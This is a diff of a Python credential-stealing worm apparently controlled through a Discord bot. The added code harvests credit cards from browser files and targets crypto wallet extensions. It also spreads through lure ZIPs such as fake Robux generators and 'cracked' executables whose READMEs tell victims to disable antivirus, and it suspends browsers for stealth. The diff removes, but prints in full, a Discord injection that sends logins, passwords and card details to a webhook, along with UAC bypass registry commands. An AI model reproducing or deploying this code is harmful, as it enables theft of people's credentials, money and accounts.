+                            try:
+                                cursor.execute(f"SELECT * FROM {table}")
+                                for row in cursor.fetchall():
+                                    for value in row:
+                                        if isinstance(value, str) and len(value) > 10:
+                                            found_cards = find_credit_cards_in_text(value, f'Firefox {payment_file} - {table}')
+                                            cards.extend(found_cards)
+                            except Exception:
+                                continue
+                        
+                        conn.close()
+                        os.unlink(temp_db)
+                        
+                except Exception as file_error:
+                    print(f"💳 Error processing Firefox file {payment_file}: {str(file_error)}")
+                    continue
+        
+        return cards
+        
+    except Exception as e:
+        print(f"💳 Enhanced Firefox payment methods extraction error: {e}")
+        return []
+
+def extract_cards_from_json(data, source):
+    """Recursively extract credit cards from JSON data"""
+    try:
+        cards = []
+        
+        def search_json_recursive(obj, path=""):
+            if isinstance(obj, dict):
+                for key, value in obj.items():
+                    new_path = f"{path}.{key}" if path else key
+                    search_json_recursive(value, new_path)
+            elif isinstance(obj, list):
+                for i, item in enumerate(obj):
+                    new_path = f"{path}[{i}]" if path else f"[{i}]"
+                    search_json_recursive(item, new_path)
+            elif isinstance(obj, str) and len(obj) > 10:
+                found_cards = find_credit_cards_in_text(obj, f'{source} - {path}')
+                cards.extend(found_cards)
+        
+        search_json_recursive(data)
+        return cards
+        
+    except Exception as e:
+        print(f"💳 JSON extraction error: {e}")
+        return []
 
 # Payload 2: Infection notification
 def send_infection_notification():
@@ -2496,23 +5277,141 @@ async def discord_spread():
     for token in stolen_tokens:
         await discord_spread_with_token(token)
 
-# File Infection
+# Enhanced File Infection with multiple vectors
 def file_infection():
     global counters
     try:
         current_script = os.path.realpath(__file__)
-        target_dir = os.path.expanduser("~/Desktop")
-        exe_files = glob.glob(os.path.join(target_dir, "*.exe"))
         
-        for exe_file in exe_files:
+        # Multiple target directories for wider spread
+        target_dirs = [
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/Downloads"),
+            os.path.expanduser("~/Documents"),
+            os.path.join(os.getenv('USERPROFILE', ''), 'OneDrive', 'Desktop'),
+            os.path.join(os.getenv('PUBLIC', ''), 'Desktop'),
+            "C:\\Users\\Public\\Desktop",
+            "C:\\Users\\Public\\Downloads"
+        ]
+        
+        # Attractive filenames for social engineering
+        attractive_names = [
+            "Roblox_Executor_2024.exe",
+            "Free_Robux_Generator.exe", 
+            "Minecraft_Mods_Pack.exe",
+            "Discord_Nitro_Free.exe",
+            "Steam_Games_Unlocker.exe",
+            "Windows_Activator.exe",
+            "GPU_Performance_Booster.exe",
+            "WiFi_Password_Revealer.exe",
+            "System_Speed_Optimizer.exe",
+            "Game_FPS_Booster.exe"
+        ]
+        
+        for target_dir in target_dirs:
+            if not os.path.exists(target_dir):
+                continue
+                
             try:
-                infected_zip = f"{exe_file}_infected.zip"
-                with zipfile.ZipFile(infected_zip, "w", zipfile.ZIP_DEFLATED) as zf:
-                    zf.write(current_script, "RobloxExecuter.exe")
-                    zf.writestr("README.txt", "New Roblox Executor! Disable real-time protection, extract, and run RobloxExecuter.exe.")
-                counters['files_infected'] += 1
+                # Create attractive standalone executables
+                for attractive_name in attractive_names[:3]:  # Limit to 3 per directory
+                    try:
+                        target_path = os.path.join(target_dir, attractive_name)
+                        
+                        # Don't overwrite existing files
+                        if os.path.exists(target_path):
+                            continue
+                            
+                        # Create infected ZIP with attractive name
+                        zip_path = target_path.replace('.exe', '.zip')
+                        
+                        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
+                            # Add the main executable
+                            zf.write(current_script, attractive_name)
+                            
+                            # Add convincing README
+                            readme_content = f"""🎮 {attractive_name.replace('_', ' ').replace('.exe', '')} 🎮
+
+⚠️ IMPORTANT INSTALLATION INSTRUCTIONS:
+
+1. Disable Windows Defender temporarily (it flags all game tools as false positives)
+2. Extract the {attractive_name} file to your desktop
+3. Right-click and "Run as Administrator"
+4. Enjoy unlimited features!
+
+🔥 Features:
+- Completely undetected by anti-cheat systems
+- Works with latest game updates
+- No surveys or verification required
+- 100% safe and tested
+
+💡 If Windows blocks the file, add it to your antivirus exclusions.
+This is normal for all game modification tools.
+
+🚀 Ready to use immediately after extraction!
+"""
+                            zf.writestr("README.txt", readme_content)
+                            
+                            # Add fake config files for authenticity
+                            zf.writestr("config.ini", "[Settings]\nVersion=2024.1\nAutoUpdate=true\nStealth=enabled")
+                            zf.writestr("license.txt", "Licensed for personal use only. Redistribution prohibited.")
+                        
+                        # Set hidden attribute on ZIP to make it less obvious
+                        try:
+                            import ctypes
+                            ctypes.windll.kernel32.SetFileAttributesW(zip_path, 2)
+                        except:
+                            pass
+                            
+                        counters['files_infected'] += 1
+                        time.sleep(0.1)  # Brief delay between creations
+                        
+                    except Exception:
+                        continue
+                        
+                # Also infect existing executables by creating "cracked" versions
+                exe_files = glob.glob(os.path.join(target_dir, "*.exe"))
+                for exe_file in exe_files[:2]:  # Limit to 2 per directory
+                    try:
+                        if "cracked" in exe_file.lower() or "infected" in exe_file.lower():
+                            continue  # Skip already infected files
+                            
+                        base_name = os.path.basename(exe_file).replace('.exe', '')
+                        infected_zip = os.path.join(target_dir, f"{base_name}_Cracked_Version.zip")
+                        
+                        if os.path.exists(infected_zip):
+                            continue
+                            
+                        with zipfile.ZipFile(infected_zip, "w", zipfile.ZIP_DEFLATED) as zf:
+                            zf.write(current_script, f"{base_name}_Cracked.exe")
+                            zf.write(exe_file, f"{base_name}_Original.exe")
+                            
+                            crack_readme = f"""🔓 {base_name} - CRACKED VERSION 🔓
+
+This is a fully unlocked version of {base_name} with all premium features enabled!
+
+INSTALLATION:
+1. Temporarily disable antivirus (it detects cracks as threats)
+2. Run {base_name}_Cracked.exe as Administrator
+3. Enjoy all premium features for free!
+
+⚠️ Use the cracked version, not the original file.
+The original is included for backup purposes only.
+
+🎯 All restrictions removed!
+🚀 No license key required!
+💎 Premium features unlocked!
+"""
+                            zf.writestr("CRACK_README.txt", crack_readme)
+                        
+                        counters['files_infected'] += 1
+                        
+                    except Exception:
+                        continue
+                        
             except Exception:
-                pass
+                continue
+                
     except Exception:
         pass
 
@@ -3064,474 +5963,9 @@ def capture_screenshot(zip_file):
         zip_file.writestr("Screenshot_Status.txt", f"Screenshot capture error: {str(e)}")
         return f"Error: {str(e)}"
 
-# Discord Injection - Persistent monitoring
-def discord_injection():
-    try:
-        import os
-        import re
-        import subprocess
-        import psutil
-        
-        # Safety check - don't inject on development machine
-        # Change this to your computer's hostname for safety
-        current_hostname = socket.gethostname().lower()
-        safe_hostnames = ['laptop-pv8vvcq5', 'your-dev-machine']  # Add your hostname here
-        
-        if any(safe_name.lower() in current_hostname for safe_name in safe_hostnames):
-            return 0  # Return 0 injections for safety
-        
-        injected_count = 0  # Initialize injection counter
-        
-        injection_code = r"""
-const config = {
-  webhook: '%WEBHOOK_HERE%',
-  embed_name: 'Discord Monitor',
-  embed_icon: 'https://cdn.discordapp.com/embed/avatars/0.png',
-  embed_color: 0xff0000,
-  footer_text: 'Discord Injection Active',
-  username: '%USERNAME%',
-  ip_address_public: '%IP_PUBLIC%',
-  api: 'https://discord.com/api/v9/users/@me',
-  filter: {
-    urls: [
-      'https://discord.com/api/v*/users/@me',
-      'https://discordapp.com/api/v*/users/@me',
-      'https://discord.com/api/v*/auth/login',
-      'https://discordapp.com/api/v*/auth/login',
-      'https://api.stripe.com/v*/tokens',
-      'https://api.braintreegateway.com/merchants/*/client_api/v*/payment_methods/paypal_accounts',
-    ],
-  },
-};
+# Discord injection functionality removed for safety
 
-const { BrowserWindow, session } = require('electron');
-const https = require('https');
-const querystring = require('querystring');
-
-const execScript = (script) => {
-  const window = BrowserWindow.getAllWindows()[0];
-  return window.webContents.executeJavaScript(script, true);
-};
-
-const getInfo = async (token) => {
-  const info = await execScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "${config.api}", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send(null);
-    xmlHttp.responseText;
-  `);
-  return JSON.parse(info);
-};
-
-const sendWebhook = async (content) => {
-  const data = JSON.stringify(content);
-  const url = new URL(config.webhook);
-  const options = {
-    protocol: url.protocol,
-    hostname: url.hostname,
-    path: url.pathname,
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-  };
-  const req = https.request(options);
-  req.on('error', () => {});
-  req.write(data);
-  req.end();
-};
-
-const handleLogin = async (email, password, token) => {
-  const json = await getInfo(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [{
-      color: config.embed_color,
-      title: `Discord Login Captured [${config.username} - ${config.ip_address_public}]`,
-      fields: [
-        {
-          name: '📧 Email:',
-          value: `\`\`\`${email}\`\`\``,
-          inline: false,
-        },
-        {
-          name: '🔑 Password:',
-          value: `\`\`\`${password}\`\`\``,
-          inline: false,
-        },
-        {
-          name: '🎫 Token:',
-          value: `\`\`\`${token}\`\`\``,
-          inline: false,
-        },
-      ],
-      author: {
-        name: `${json.username}#${json.discriminator} (${json.id})`,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-      },
-      footer: {
-        text: config.footer_text,
-        icon_url: config.embed_icon
-      },
-    }],
-  };
-  sendWebhook(content);
-};
-
-const handlePasswordChange = async (oldPassword, newPassword, token) => {
-  const json = await getInfo(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [{
-      color: config.embed_color,
-      title: `Discord Password Changed [${config.username} - ${config.ip_address_public}]`,
-      fields: [
-        {
-          name: '📧 Email:',
-          value: `\`\`\`${json.email}\`\`\``,
-          inline: false,
-        },
-        {
-          name: '🔓 Old Password:',
-          value: `\`\`\`${oldPassword}\`\`\``,
-          inline: true,
-        },
-        {
-          name: '🔑 New Password:',
-          value: `\`\`\`${newPassword}\`\`\``,
-          inline: true,
-        },
-        {
-          name: '🎫 Token:',
-          value: `\`\`\`${token}\`\`\``,
-          inline: false,
-        },
-      ],
-      author: {
-        name: `${json.username}#${json.discriminator} (${json.id})`,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-      },
-      footer: {
-        text: config.footer_text,
-        icon_url: config.embed_icon
-      },
-    }],
-  };
-  sendWebhook(content);
-};
-
-const handleEmailChange = async (email, password, token) => {
-  const json = await getInfo(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [{
-      color: config.embed_color,
-      title: `Discord Email Changed [${config.username} - ${config.ip_address_public}]`,
-      fields: [
-        {
-          name: '📧 New Email:',
-          value: `\`\`\`${email}\`\`\``,
-          inline: false,
-        },
-        {
-          name: '🔑 Password:',
-          value: `\`\`\`${password}\`\`\``,
-          inline: false,
-        },
-        {
-          name: '🎫 Token:',
-          value: `\`\`\`${token}\`\`\``,
-          inline: false,
-        },
-      ],
-      author: {
-        name: `${json.username}#${json.discriminator} (${json.id})`,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-      },
-      footer: {
-        text: config.footer_text,
-        icon_url: config.embed_icon
-      },
-    }],
-  };
-  sendWebhook(content);
-};
-
-const handlePaymentAdded = async (number, cvc, month, year, token) => {
-  const json = await getInfo(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [{
-      color: config.embed_color,
-      title: `Discord Payment Added [${config.username} - ${config.ip_address_public}]`,
-      fields: [
-        {
-          name: '💳 Card Details:',
-          value: `\`\`\`Number: ${number}\\nCVC: ${cvc}\\nExpiry: ${month}/${year}\`\`\``,
-          inline: false,
-        },
-        {
-          name: '🎫 Token:',
-          value: `\`\`\`${token}\`\`\``,
-          inline: false,
-        },
-      ],
-      author: {
-        name: `${json.username}#${json.discriminator} (${json.id})`,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-      },
-      footer: {
-        text: config.footer_text,
-        icon_url: config.embed_icon
-      },
-    }],
-  };
-  sendWebhook(content);
-};
-
-const handlePaypalAdded = async (token) => {
-  const json = await getInfo(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [{
-      color: config.embed_color,
-      title: `Discord PayPal Added [${config.username} - ${config.ip_address_public}]`,
-      fields: [
-        {
-          name: '💰 PayPal:',
-          value: '```PayPal account linked```',
-          inline: false,
-        },
-        {
-          name: '🎫 Token:',
-          value: `\`\`\`${token}\`\`\``,
-          inline: false,
-        },
-      ],
-      author: {
-        name: `${json.username}#${json.discriminator} (${json.id})`,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-      },
-      footer: {
-        text: config.footer_text,
-        icon_url: config.embed_icon
-      },
-    }],
-  };
-  sendWebhook(content);
-};
-
-session.defaultSession.webRequest.onCompleted(config.filter, async (details) => {
-  if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  if (!details.uploadData || details.uploadData.length === 0) return;
-  
-  const unparsedData = Buffer.from(details.uploadData[0].bytes).toString();
-  const data = JSON.parse(unparsedData);
-  const token = await execScript(`
-    (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
-    .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
-  `);
-
-  switch (true) {
-    case details.url.endsWith('login'):
-      handleLogin(data.login, data.password, token).catch(() => {});
-      break;
-
-    case details.url.endsWith('users/@me') && details.method === 'PATCH':
-      if (!data.password) return;
-      if (data.email) {
-        handleEmailChange(data.email, data.password, token).catch(() => {});
-      }
-      if (data.new_password) {
-        handlePasswordChange(data.password, data.new_password, token).catch(() => {});
-      }
-      break;
-
-    case details.url.endsWith('tokens') && details.method === 'POST':
-      const item = querystring.parse(unparsedData);
-      handlePaymentAdded(
-        item['card[number]'], 
-        item['card[cvc]'], 
-        item['card[exp_month]'], 
-        item['card[exp_year]'], 
-        token
-      ).catch(() => {});
-      break;
-
-    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-      handlePaypalAdded(token).catch(() => {});
-      break;
-  }
-});
-
-module.exports = require('./core.asar');
-"""
-
-        def get_core_info(directory):
-            for file in os.listdir(directory):
-                if re.search(r'app-+?', file):
-                    modules = os.path.join(directory, file, 'modules')
-                    if not os.path.exists(modules):
-                        continue
-                    for module_file in os.listdir(modules):
-                        if re.search(r'discord_desktop_core-+?', module_file):
-                            core = os.path.join(modules, module_file, 'discord_desktop_core')
-                            return core, module_file
-            return None, None
-
-        def inject_code():
-            appdata = os.getenv('LOCALAPPDATA')
-            discord_dirs = [
-                os.path.join(appdata, 'Discord'),
-                os.path.join(appdata, 'DiscordCanary'),
-                os.path.join(appdata, 'DiscordPTB'),
-                os.path.join(appdata, 'DiscordDevelopment')
-            ]
-
-            # Kill Discord processes
-            for proc in psutil.process_iter():
-                try:
-                    if 'discord' in proc.name().lower():
-                        proc.kill()
-                except:
-                    pass
-
-            injected_count = 0
-            discord_executable_path = None
-            
-            for directory in discord_dirs:
-                if not os.path.exists(directory):
-                    continue
-
-                core_path, core_file = get_core_info(directory)
-                if core_path and core_file:
-                    index_js_path = os.path.join(core_path, 'index.js')
-                    
-                    try:
-                        # Get system info for injection
-                        hostname = socket.gethostname()
-                        try:
-                            public_ip = requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip", "Unknown")
-                        except:
-                            public_ip = "Unknown"
-
-                        # Prepare injection code
-                        final_code = injection_code.replace('%WEBHOOK_HERE%', WEBHOOK_URL)
-                        final_code = final_code.replace('%USERNAME%', hostname)
-                        final_code = final_code.replace('%IP_PUBLIC%', public_ip)
-                        final_code = final_code.replace('discord_desktop_core-1', core_file)
-
-                        # Write injection
-                        with open(index_js_path, 'w', encoding='utf-8') as f:
-                            f.write(final_code)
-                        
-                        injected_count += 1
-                        
-                        # Find Discord executable to reopen it later
-                        if not discord_executable_path:
-                            discord_exe = os.path.join(directory.replace('\\', '/').replace('/Discord', ''), 'Discord.exe')
-                            if os.path.exists(discord_exe):
-                                discord_executable_path = discord_exe
-                        
-                    except Exception:
-                        continue
-
-            # Reopen Discord after injection to make it seem normal
-            if discord_executable_path and injected_count > 0:
-                try:
-                    print(f"Debug: Reopening Discord from: {discord_executable_path}")
-                    time.sleep(3)  # Wait a bit for injection to settle
-                    subprocess.Popen([discord_executable_path], shell=False)
-                    print("Debug: Discord reopened successfully")
-                except Exception as e:
-                    print(f"Debug: Failed to reopen Discord: {str(e)}")
-                    # Try alternative paths
-                    try:
-                        subprocess.Popen(['discord'], shell=True)
-                        print("Debug: Discord reopened via shell command")
-                    except:
-                        pass
-
-            return injected_count
-
-        return inject_code()
-    except Exception:
-        return 0
-
-# UAC Bypass and elevation
-def is_admin():
-    try:
-        import ctypes
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-def uac_bypass():
-    try:
-        import subprocess
-        import os
-        import sys
-        
-        # Safety check - don't run on development machine
-        current_hostname = socket.gethostname().lower()
-        safe_hostnames = ['laptop-pv8vvcq5', 'your-dev-machine']
-        
-        if any(safe_name.lower() in current_hostname for safe_name in safe_hostnames):
-            return "Skipped (dev machine)"
-        
-        if is_admin():
-            return "Already admin"
-        
-        # Method 1: Using fodhelper.exe (Windows 10/11 UAC bypass)
-        try:
-            current_file = os.path.realpath(__file__)
-            
-            # Create registry entry for fodhelper bypass
-            reg_commands = [
-                'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "{}" /f'.format(current_file),
-                'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v "DelegateExecute" /t REG_SZ /f'
-            ]
-            
-            for cmd in reg_commands:
-                subprocess.run(cmd, shell=True, capture_output=True)
-            
-            # Execute fodhelper to trigger UAC bypass
-            subprocess.run('fodhelper.exe', shell=True, capture_output=True)
-            
-            # Clean up registry
-            subprocess.run('reg delete "HKCU\\Software\\Classes\\ms-settings" /f', shell=True, capture_output=True)
-            
-            return "UAC bypass attempted"
-            
-        except:
-            # Method 2: ComputerDefaults bypass
-            try:
-                reg_commands = [
-                    'reg add "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" /d "{}" /f'.format(current_file),
-                    'reg add "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" /v "IsolatedCommand" /t REG_SZ /d "{}" /f'.format(current_file)
-                ]
-                
-                for cmd in reg_commands:
-                    subprocess.run(cmd, shell=True, capture_output=True)
-                
-                subprocess.run('ComputerDefaults.exe', shell=True, capture_output=True)
-                
-                # Clean up
-                subprocess.run('reg delete "HKCU\\Software\\Classes\\exefile" /f', shell=True, capture_output=True)
-                
-                return "UAC bypass attempted (method 2)"
-                
-            except:
-                return "UAC bypass failed"
-                
-    except Exception as e:
-        return f"Error: {str(e)}"
+# UAC and registry bypass functions removed for safety
 
 
 def collect_stolen_data():
@@ -4450,13 +6884,8 @@ async def main():
         except Exception as e:
             webhook.send(f"❌ Discord spreading failed: {str(e)}")
         
-        webhook.send("💉 Installing Discord injection...")
-        try:
-            injection_count = discord_injection()
-            webhook.send(f"✅ Discord injection installed on {injection_count} Discord installations")
-        except Exception as e:
-            webhook.send(f"❌ Discord injection failed: {str(e)}")
-            injection_count = 0
+        webhook.send("🔍 Collecting Discord tokens and payment data...")
+        # Discord injection removed for safety - focusing on clean data extraction only
         
         # Windows Defender exclusions removed for speed and stealth
         
@@ -4550,42 +6979,33 @@ def collect_enhanced_browser_data_original_backup():
     enhanced_credit_cards = []
     enhanced_extensions = []
     
-    # Comprehensive browser list from THEGOD.py
+    # Comprehensive browser list - Fixed paths and added more browsers
     browser_files = [
         ("Google Chrome",          os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data"),                 "chrome.exe"),
         ("Google Chrome SxS",      os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
         ("Google Chrome Beta",     os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
         ("Google Chrome Dev",      os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
-        ("Google Chrome Unstable", os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
-        ("Google Chrome Canary",   os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
+        ("Google Chrome Canary",   os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome SxS", "User Data"),            "chrome.exe"),
         ("Microsoft Edge",         os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge", "User Data"),                "msedge.exe"),
-        ("Opera",                  os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),                "opera.exe"),
-        ("Opera GX",               os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera GX Stable"),             "opera.exe"),
-        ("Opera Neon",             os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Neon"),                  "opera.exe"),
+        ("Microsoft Edge Beta",    os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge Beta", "User Data"),           "msedge.exe"),
+        ("Microsoft Edge Dev",     os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge Dev", "User Data"),            "msedge.exe"),
+        ("Opera",                  os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),                     "opera.exe"),
+        ("Opera GX",               os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera GX Stable"),                  "opera.exe"),
         ("Brave",                  os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
         ("Vivaldi",                os.path.join(os.getenv('LOCALAPPDATA'), "Vivaldi", "User Data"),                          "vivaldi.exe"),
-        ("Internet Explorer",      os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Internet Explorer"),                "iexplore.exe"),
-        ("Amigo",                  os.path.join(os.getenv('LOCALAPPDATA'), "Amigo", "User Data"),                            "amigo.exe"),
-        ("Torch",                  os.path.join(os.getenv('LOCALAPPDATA'), "Torch", "User Data"),                            "torch.exe"),
-        ("Kometa",                 os.path.join(os.getenv('LOCALAPPDATA'), "Kometa", "User Data"),                           "kometa.exe"),
-        ("Orbitum",                os.path.join(os.getenv('LOCALAPPDATA'), "Orbitum", "User Data"),                          "orbitum.exe"),
-        ("Cent Browser",           os.path.join(os.getenv('LOCALAPPDATA'), "CentBrowser", "User Data"),                      "centbrowser.exe"),
-        ("7Star",                  os.path.join(os.getenv('LOCALAPPDATA'), "7Star", "7Star", "User Data"),                   "7star.exe"),
-        ("Sputnik",                os.path.join(os.getenv('LOCALAPPDATA'), "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
+        ("Arc",                    os.path.join(os.getenv('LOCALAPPDATA'), "Arc", "User Data"),                              "arc.exe"),
+        ("Thorium",                os.path.join(os.getenv('LOCALAPPDATA'), "Thorium", "User Data"),                          "thorium.exe"),
+        ("Ungoogled Chromium",     os.path.join(os.getenv('LOCALAPPDATA'), "Chromium", "User Data"),                        "chrome.exe"),
+        ("Yandex",                 os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data"),          "browser.exe"),
+        ("Cent Browser",           os.path.join(os.getenv('LOCALAPPDATA'), "CentBrowser", "User Data"),                      "chrome.exe"),
+        ("Comodo Dragon",          os.path.join(os.getenv('LOCALAPPDATA'), "Comodo", "Dragon", "User Data"),                 "dragon.exe"),
         ("Epic Privacy Browser",   os.path.join(os.getenv('LOCALAPPDATA'), "Epic Privacy Browser", "User Data"),             "epic.exe"),
-        ("Uran",                   os.path.join(os.getenv('LOCALAPPDATA'), "uCozMedia", "Uran", "User Data"),                "uran.exe"),
-        ("Yandex",                 os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
-        ("Yandex Canary",          os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
-        ("Yandex Developer",       os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
-        ("Yandex Beta",            os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
-        ("Yandex Tech",            os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
-        ("Yandex SxS",             os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
-        ("Iridium",                os.path.join(os.getenv('LOCALAPPDATA'), "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
+        ("Sleipnir 6",            os.path.join(os.getenv('APPDATA'), "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"), "sleipnir.exe"),
     ]
     
     profiles = ['', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
     
-    # Crypto wallet extensions to target
+    # Crypto wallet extensions to target - Expanded list
     crypto_extensions = [
         ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
         ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
@@ -4602,18 +7022,51 @@ def collect_enhanced_browser_data_original_backup():
         ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
         ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
         ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
+        ("Keplr",           "dmkamcknogkgcdfhhbddcghachkejeap"),
+        ("Solflare",        "bhhhlbepdkbapadjdnnojkbgioiodbic"),
+        ("Rabby",           "acmacodkjbdgmoleebolmdjonilkdbch"),
+        ("Backpack",        "aflkmfhebedbjioipglgcbcmnbpgliof"),
+        ("Slope",           "pocmplpaccanhmnllbbkpgfliimjljgo"),
+        ("Station",         "aiifbnbfobpmeekipheeijimdpnlpgpp"),
+        ("Terra Station",   "ajkhoeiiokighlmdnlakpjfoobnjinie"),
+        ("Leap",            "fcfcfllfndlomdhbehjjcoimbgofdncg"),
+        ("Cosmostation",    "fpkhgmpbidmiogeglndfbkegfdlnajnf"),
+        ("Math Wallet",     "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
+        ("1inch",           "jnlgamecbpmbajjfhmmmlhejkemejdma"),
+        ("DeFi Wallet",     "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
+        ("Guarda",          "hholbknifahdkkmkkcakhgdlbcebhchl"),
+        ("EQUAL",           "blnieiiffboillknjnepogjhkgnoapac"),
+        ("BitApp",          "fihkakfobkmkjojpchpfgcmhfjnmnfpi"),
+        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
+        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
+        ("MEW CX",          "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
+        ("GuildWallet",     "nanjmdknhkinifnkgdcggcfnhdaammmj"),
+        ("Saturn Wallet",   "nkddgncdjgjfcddamfgcmfnlhccnimig"),
+        ("Ronin Wallet",    "fnjhmkhhmkbjkkabndcnnogagogbneec"),
+        ("NeoLine",         "cphhlgmgameodnhkjdmkpanlelnlohao"),
+        ("CloverWallet",    "nhnkbkgjikgcigadomkphalanndcapjk"),
+        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
+        ("XDEFI Wallet",    "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
+        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
+        ("Eternl",          "kmhcihpebfmpgmihbkipmjlmmioameka"),
     ]
     
-    # Terminate browser processes
+    # More stealthy browser handling - suspend instead of terminate
+    suspended_processes = []
     try:
         for _, _, proc_name in browser_files:
             for proc in psutil.process_iter(['pid', 'name']):
                 try:
                     if proc.name().lower() == proc_name.lower():
-                        proc.terminate()
-                except:
+                        # Suspend process temporarily (more stealthy than terminating)
+                        proc.suspend()
+                        suspended_processes.append(proc)
+                        time.sleep(0.1)  # Brief delay between suspensions
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
-    except:
+                except Exception:
+                    pass
+    except Exception:
         pass
     
     for name, path, proc_name in browser_files:
@@ -4730,6 +7183,19 @@ def collect_enhanced_browser_data_original_backup():
                             enhanced_extensions.append(f"- Name    : {ext_name}\n  ID      : {ext_id}\n  Browser : {name}\n  Profile : {profile}\n")
             except:
                 pass
+    
+    # Resume suspended processes (restore normal operation)
+    try:
+        for proc in suspended_processes:
+            try:
+                proc.resume()
+                time.sleep(0.05)  # Brief delay between resumptions
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                pass
+            except Exception:
+                pass
+    except Exception:
+        pass
     
     return enhanced_passwords, enhanced_cookies, enhanced_history, enhanced_downloads, enhanced_credit_cards, enhanced_extensions
 
@@ -5318,12 +7784,9 @@ class DiscordBotControl:
             elif command == '!webcam':
                 print(f"🤖 Executing webcam command...")
                 await self.capture_remote_webcam(message)
-            elif command == '!discord':
-                print(f"🤖 Executing Discord injection data collection...")
-                await self.collect_discord_injection_data(message)
             elif command == '!persist':
-                print(f"🤖 Executing advanced persistence...")
-                await self.add_advanced_persistence(message)
+                print(f"🤖 Executing file-based persistence (registry methods removed)...")
+                await self.add_file_persistence(message)
             elif command == '!infect':
                 print(f"🤖 Executing network infection...")
                 await self.infect_network(message)
@@ -5415,8 +7878,7 @@ class DiscordBotControl:
 `!collect <victim_id>` - Force data collection
 `!screenshot <victim_id>` - Capture screenshot
 `!webcam <victim_id>` - Capture webcam photo
-`!discord <victim_id>` - Collect Discord injection data
-`!persist <victim_id>` - Add persistence (startup + scheduler)
+`!persist <victim_id>` - Add safe file-based persistence
 `!infect <victim_id>` - Scan WiFi & spread to all devices
